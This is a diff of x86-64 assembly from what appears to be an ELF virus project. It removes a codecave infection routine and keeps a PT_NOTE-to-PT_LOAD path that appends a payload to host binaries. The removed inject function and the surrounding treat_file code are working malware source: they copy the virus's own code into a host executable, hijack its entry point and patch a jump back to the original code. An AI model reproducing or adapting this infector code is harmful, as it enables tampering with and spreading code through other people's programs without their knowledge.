@@ -346,28 +346,8 @@ treat_file:
 	cmp rax, 1					; if (is_elf_64(mappedfile) != 1)
 	jne .unmap_err					; 	goto .unmap_err
 
-	; Find executable segment
-	mov rdi, [mappedfile]				; res = find_exec_segment(mappedfile);
-	call find_exec_segment				; ...
-	cmp rax, 0					; if (res == NULL)
-	je .unmap_err					; 	goto .unmap_err
-	mov [exec_segment], rax				; exec_segment = res;
-
-	; Check if file has signature
-	; TODO Check also with PT_NOTE method
-	; TODO Maybe put signature at other place
-	mov rdi, [mappedfile]				; has_signature(mappedfile, exec_segment);
-	mov rsi, [exec_segment]				; ...
-	call has_signature				; ...
-	cmp rax, 1					; if (has_signature(mappedfile, exec_segment) == 1)
-	je .unmap_file					; 	goto .unmap_file
-
-	; TODO: check codecave can contain payload
-	; Inject payload
-; TODO: Activate this again
-;	mov rdi, [mappedfile]				; inject(mappedfile, exec_segment);
-;	mov rsi, [exec_segment]				; ...
-;	call inject					; ...
+	; TODO: Check if file has signature
+	
 
 	mov rax, [filesize]				; payload_offset = filesize;
 	mov [payload_offset], rax			; ...
@@ -384,10 +364,6 @@ treat_file:
 
 	mov rdi, _end - begin				; payload_size = _end - begin;
 	mov [payload_size], rdi				; ...
-
-	; TODO: If codecave can't contains payload
-	;	try PT_NOTE method
-	; TODO Check if PT_NOTE method available
 
 	; TODO rcx peut être différent de r8 si on fait de la compression
 	mov rdi, [mappedfile]				; convert_pt_note_to_load(mappedfile,
@@ -463,11 +439,7 @@ treat_file:
 	mov [rdi], rax					; ...
 
 	
-	; TODO: check codecave can contain signature
-	; Sign file
-;	mov rdi, [mappedfile]				; sign(mappedfile, exec_segment);
-;	mov rsi, [exec_segment]				; ...
-;	call sign					; ...
+	; TODO: sign
 
 	jmp .unmap_file
 
@@ -610,79 +582,6 @@ is_elf_64:
 		mov rax, 1				; return 1;
 		ret
 
-;elf64_phdr *find_exec_segment(char const *_file_map)
-;rax find_exec_segment(rdi file_map);
-find_exec_segment:
-	%push context
-	%stacksize flat64
-	%assign %$localsize 0
-
-	%local file_map:qword				; char const *file_map;
-	%local res_header:qword				; elf64_phdr *res_header;
-	%local e_phoff:qword				; long e_phoff;
-	%local e_phentsize:qword			; long e_phentsize;
-	%local e_phnum:qword				; long e_phnum;
-
-	; Initializes stack frame
-	push rbp
-	mov rbp, rsp
-	sub rsp, %$localsize
-
-	mov [file_map], rdi				; file_map = _file_map;
-	mov ax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
-	mov [e_phoff], rax				; ...
-	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
-	mov [e_phentsize], rax				; ...
-	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
-	mov [e_phnum], rax				; ...
-
-	; loop through program headers
-	mov rsi, 0					; i = 0;
-	.begin_phdr_loop:				; while (true) {
-		mov rax, [file_map]			; cur_phdr = file_map
-		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
-		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
-		imul rcx, rsi				; 		...
-		add rax, rcx				; 		...
-		mov [res_header], rax			; res_header = cur_phdr;
-
-		; check if PT_LOAD
-		mov rdi, [res_header]			; if (cur_phdr->p_type != PT_LOAD)
-		add rdi, elf64_phdr.p_type		; ...
-		mov ax, [rdi]				; ...
-		cmp ax, PT_LOAD				; ...
-		jne .next_phdr_loop			; 	goto next_phdr_loop;
-
-		; check if executable
-		mov rdi, [res_header]			; if (!(cur_phdr->p_flags & PF_X))
-		add rdi, elf64_phdr.p_flags		; ...
-		mov ax, [rdi]				; ...
-		and ax, PF_X				; ...
-		cmp ax, PF_X				; ...
-		jne .next_phdr_loop			; 	goto next_phdr_loop;
-
-		jmp .found				; goto found;
-
-	.next_phdr_loop:
-		inc rsi					; i++;
-		cmp rsi, [e_phnum]			; if (i == e_phnum)
-		je .not_found				; 	goto not_found;
-		jmp .begin_phdr_loop			; }
-
-	.not_found:
-		xor rax, rax				; res = 0;
-		jmp .end				; goto end
-
-	.found:
-		mov rax, [res_header]			; res = res_header;
-		jmp .end				; goto end
-
-.end:
-	add rsp, %$localsize
-	pop rbp
-	%pop
-	ret
-
 ; TODO Optimize with find_exec_segment
 ;elf64_phdr *find_note_segment(char const *_file_map)
 ;rax find_note_segment(rdi file_map);
@@ -808,83 +707,6 @@ sign:
 	
 	.end:
 		ret
-; void inject(char const *file_map, elf64_phdr *exec_segment)
-; void inject(rdi file_map, rsi exec_segment);
-inject:
-	%push context
-	%stacksize flat64
-	%assign %$localsize 0
-
-	%local file_map:qword				; char const *file_map;
-	%local exec_segment:qword			; elf64_phdr *exec_segment;
-	%local old_entry:qword				; long old_entry;
-	%local new_entry:qword				; long new_entry;
-	%local computed_jmp_value:dword			; int computed_jmp_value;
-
-	; Initializes stack frame
-	push rbp
-	mov rbp, rsp
-	sub rsp, %$localsize
-
-	mov [file_map], rdi				; file_map = _file_map;
-	mov [exec_segment], rsi				; exec_segment = _exec_segment;
-
-	add rdi, elf64_hdr.e_entry			; old_entry = elf64_hdr.e_entry;
-	mov rax, [rdi]					; ...
-	mov [old_entry], rax				; ...
-
-	mov rdi, [exec_segment]				; new_entry = file_map + exec_segment->p_offset + exec_segment->p_filesz;
-	add rdi, elf64_phdr.p_offset			; ...
-	mov rax, [rdi]					; ...
-	mov rdi, [exec_segment]				; ...
-	add rdi, elf64_phdr.p_filesz			; ...
-	add rax, [rdi]					; ...
-	mov [new_entry], rax				; ...
-
-	mov rdi, [file_map]				; elf64_hdr.e_entry = new_entry
-	add rdi, elf64_hdr.e_entry			; ...
-	mov rsi, [new_entry]				; ...
-	mov [rdi], rsi					; ...
-
-	; copy all bytes between _start and _end to the codecave
-	mov rdi, [file_map]				; dest = file_map + new_entry;
-	add rdi, [new_entry]				; ...
-	lea rsi, [rel _start]				; src = _start;
-	mov rcx, _end - _start				; len = _end - _start;
-	rep movsb					; memcpy(dest, src, len);
-
-	; increment segment size
-	mov rdi, [exec_segment]				; exec_segment->p_memsz += _end - _start;
-	add rdi, elf64_phdr.p_memsz			; ...
-	add qword [rdi], _end - _start			; ...
-	mov rdi, [exec_segment]				; exec_segment->p_filesz += _end - _start;
-	add rdi, elf64_phdr.p_filesz			; ...
-	add qword [rdi], _end - _start			; ...
-
-	; compute jmp_value
-							; code_length_to_jmp = _jmp_instr - _start + 5 (5 is the size of the jmp instruction)
-	; TODO "C'est assez petit yolo on s'en fout mais old_entry et new_entry sont en 64bits"
-	mov edi, [old_entry]				; computed_jmp_value = old_entry - (new_entry + code_length_to_jmp);
-	sub edi, [new_entry]				; ...
-	sub edi, _jmp_instr - _start			; ...
-	sub edi, 5					; ...
-	mov [computed_jmp_value], edi			; ...
-
-	; change jmp_value in injected code
-	mov rdi, [file_map]				; jmp_value_ptr = file_map + new_entry + (_end - _start) - 8 (8 is the size of the jmp_value variable);
-	add rdi, [new_entry]				; ...
-	add rdi, _jmp_instr - _start			; ...
-	inc rdi						; ...
-	mov esi, [computed_jmp_value]			; *jmp_value_ptr = computed_jmp_value;
-	mov [rdi], esi					; ...
-
-	jmp .end					; goto end
-
-.end:
-	add rsp, %$localsize
-	pop rbp
-	%pop
-	ret
 
 ; bool convert_pt_note_to_load(char const *_file_map,
 ;			       Elf64_Off _new_offset,
